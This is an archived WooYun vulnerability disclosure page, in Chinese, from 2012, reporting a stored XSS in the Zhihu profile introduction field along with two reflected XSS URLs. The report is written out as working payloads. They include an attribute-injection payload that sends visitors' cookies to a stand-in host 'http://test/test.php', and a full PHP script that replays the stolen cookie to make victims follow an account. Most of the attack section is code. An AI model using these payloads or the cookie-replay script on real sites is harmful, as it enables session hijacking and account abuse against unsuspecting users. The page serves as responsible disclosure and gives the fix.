@@ -1,0 +1,348 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		知乎存储型xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		知乎存储型xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/possible">possible</a> 
+</li><li>提交时间：		2012-06-20 12:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-10：	细节向普通白帽子公开<br/>
+									2012-07-20：	细节向实习白帽子公开<br/>
+									2012-08-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">知乎xss，可盗取用户cookie信息</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"> 知乎在编辑个人资料“一句话介绍”处，没有过滤双引号（过滤了&lt;、&gt;),导致span后内容可控,即形如&lt;span  可控内容&gt;&lt;/span&gt;，在啤酒@wooyun大神的指点下，终于想到在一句话介绍这里写入test&quot;  onmousemove=&quot;alert(/xss/) 只要其他用户浏览我的主页，并且鼠标点到介绍位置，就会触发代码执行，xss。<br />
+<br />
+   不知道怎样添加外部js，本来是打算这样<br />
+<br />
+&lt;span class=&quot;xmsw&quot; title=&quot;dd&quot; onmousemove=e=document.createElement(&#039;script&#039;);e.setAttribute(&#039;src&#039;,&#039;1.js&#039;);document.body.appendChild(e); id=&quot;test&quot;&gt;test&lt;/span&gt;<br />
+<br />
+无奈，服务器端有长度限制。<br />
+<br />
+<br />
+<br />
+   最后还是盗取cookie吧，大家都懂，就不细说了，一句话中写入<br />
+<br />
+x&quot;onmouseout=window.location=&#039;http://test/test.php?c=&#039;+document.cookie//<br />
+<br />
+最终结果:<br />
+<br />
+ &lt;span class=&quot;xmsw&quot; title=&quot;x&quot;onmouseout=window.location=&#039;http://test/test.php?c=&#039;+document.cookie//&quot;&gt; x&quot;onmouseout=window.location=&#039;…&lt;/span&gt; <br />
+<br />
+<br />
+<br />
+但是盗取cookie有什么用？写一个php证明一下，这个cookie可以做很多事:<br />
+<br />
+<br />
+<br />
+&lt;?php<br />
+<br />
+<br />
+<br />
+function uc_fopen($url,$post = &#039;&#039;,  $cookie = &#039;&#039;,$limit = 0,  $bysocket = FALSE, $ip = &#039;&#039;, $timeout = 15, $block = TRUE) {<br />
+<br />
+$return = &#039;&#039;;<br />
+<br />
+$matches = parse_url($url);<br />
+<br />
+!isset($matches[&#039;host&#039;]) &amp;&amp; $matches[&#039;host&#039;] = &#039;&#039;;<br />
+<br />
+!isset($matches[&#039;path&#039;]) &amp;&amp; $matches[&#039;path&#039;] = &#039;&#039;;<br />
+<br />
+!isset($matches[&#039;query&#039;]) &amp;&amp; $matches[&#039;query&#039;] = &#039;&#039;;<br />
+<br />
+!isset($matches[&#039;port&#039;]) &amp;&amp; $matches[&#039;port&#039;] = &#039;&#039;;<br />
+<br />
+$host = $matches[&#039;host&#039;];<br />
+<br />
+$path = $matches[&#039;path&#039;] ? $matches[&#039;path&#039;].($matches[&#039;query&#039;] ? &#039;?&#039;.$matches[&#039;query&#039;] : &#039;&#039;) : &#039;/&#039;;<br />
+<br />
+$port = !empty($matches[&#039;port&#039;]) ? $matches[&#039;port&#039;] : 80;<br />
+<br />
+if($post) {<br />
+<br />
+   $out = &quot;POST $path HTTP/1.0\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept: */*\r\n&quot;;<br />
+<br />
+   //$out .= &quot;Referer: $boardurl\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+<br />
+   $out .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;<br />
+<br />
+   $out .= &quot;User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n&quot;;<br />
+<br />
+   $out .= &quot;Host: $host\r\n&quot;;<br />
+<br />
+   $out .=&quot;Referer: http://www.zhihu.com/topic/%E7%94%B5%E5%BD%B1\r\n&quot;;<br />
+<br />
+   $out .= &#039;Content-Length: &#039;.strlen($post).&quot;\r\n&quot;;<br />
+<br />
+   $out .= &quot;Connection: Close\r\n&quot;;<br />
+<br />
+   $out .= &quot;Cache-Control: no-cache\r\n&quot;;<br />
+<br />
+   $out .= &quot;Cookie: $cookie\r\n\r\n&quot;;<br />
+<br />
+   $out .= $post;<br />
+<br />
+} else {<br />
+<br />
+   $out = &quot;GET $path HTTP/1.0\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept: */*\r\n&quot;;<br />
+<br />
+   //$out .= &quot;Referer: $boardurl\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+<br />
+   $out .= &quot;User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n&quot;;<br />
+<br />
+   $out .= &quot;Host: $host\r\n&quot;;<br />
+<br />
+   $out .= &quot;Connection: Close\r\n&quot;;<br />
+<br />
+   $out .= &quot;Cookie: $cookie\r\n\r\n&quot;;<br />
+<br />
+}<br />
+<br />
+$fp = @fsockopen(($ip ? $ip : $host), $port, $errno, $errstr, $timeout);<br />
+<br />
+if(!$fp) {<br />
+<br />
+   return &#039;&#039;;//note $errstr : $errno \r\n<br />
+<br />
+} else {<br />
+<br />
+   stream_set_blocking($fp, $block);<br />
+<br />
+   stream_set_timeout($fp, $timeout);<br />
+<br />
+   @fwrite($fp, $out);<br />
+<br />
+   $status = stream_get_meta_data($fp);<br />
+<br />
+   if(!$status[&#039;timed_out&#039;]) {<br />
+<br />
+    while (!feof($fp)) {<br />
+<br />
+     if(($header = @fgets($fp)) &amp;&amp; ($header == &quot;\r\n&quot; || $header == &quot;\n&quot;)) {<br />
+<br />
+      break;<br />
+<br />
+     }<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    $stop = false;<br />
+<br />
+    while(!feof($fp) &amp;&amp; !$stop) {<br />
+<br />
+     $data = fread($fp, ($limit == 0 || $limit &gt; 8192 ? 8192 : $limit));<br />
+<br />
+     $return .= $data;<br />
+<br />
+     if($limit) {<br />
+<br />
+      $limit -= strlen($data);<br />
+<br />
+      $stop = $limit &lt;= 0;<br />
+<br />
+     }<br />
+<br />
+    }<br />
+<br />
+   }<br />
+<br />
+   @fclose($fp);<br />
+<br />
+   return $return;<br />
+<br />
+}<br />
+<br />
+}<br />
+<br />
+$cookie = $_GET[&#039;c&#039;];<br />
+<br />
+echo $cookie;<br />
+<br />
+$data =&#039;type=people&amp;id=28bb2b6ff09a5072198351434ab2efff&amp;status=1&#039;;<br />
+<br />
+$url=&#039;http://www.zhihu.com/follow&#039;;<br />
+<br />
+echo uc_fopen($url,$data,$cookie);<br />
+<br />
+?&gt;<br />
+<br />
+这个php主要实现添加对yolfilm账号的关注。当有人浏览我的个人资料，当鼠标移动触发xss，就会跳转到这个页面，进而使用php对yolfilm添加关注。 其他的就不演示了，只要找到操作的数据包，然后使用php脚本提交就可以实现。 <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+而且，知乎所有提交输入的地方都没有验证码，导致可以自动提交，这个也给php脚本提交带来了便利....<br />
+<br />
+<br />
+<br />
+另外附送两个反射xss：<br />
+<br />
+http://www.zhihu.com/people/yolfilm/search?pq=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;type=all<br />
+<br />
+http://www.zhihu.com/search?q=%22/%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/20115138c937c2c296e6780415407c5b80b7e158.jpg" target="_blank"><img src="../images/20115138c937c2c296e6780415407c5b80b7e158.jpg" alt="" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/20115127f950dd0c57e50986331dc4d624674244.jpg" target="_blank"><img src="../images/20115127f950dd0c57e50986331dc4d624674244.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤&quot; 编码输出  </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/possible" title="possible">possible</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08538" title="知乎存储型xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-06-20 13:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢反馈,  已在修复 ..   </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8538";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
